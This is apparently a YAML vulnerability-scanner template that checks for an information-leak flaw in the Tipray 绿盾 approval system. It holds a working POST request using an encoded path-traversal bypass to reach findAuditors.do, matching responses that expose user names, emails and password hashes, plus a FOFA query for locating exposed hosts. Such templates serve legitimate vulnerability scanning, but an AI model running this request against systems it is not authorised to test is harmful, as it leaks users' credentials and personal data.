id: poc-yaml-tipray-gsas-findauditors-do-info-leak
info:
  name: 天锐绿盾审批系统 findAuditors.do 信息泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: 天锐绿盾审批系统
  fofa: app="TIPPAY-绿盾审批系统"
requests:
- method: POST
  path: /trwfe/login.jsp/.%2e/config/findAuditors.do
  expression: status_code == 200 && contains(body,"\"firstName\":") && contains(body,"\"email\":")
    && contains(body,"\"pwdEncodeType\":") && matches(body,"\"password\":\"([a-z0-9]{32})\"")
    && !contains(body,"<")
variables: {}
transport: http
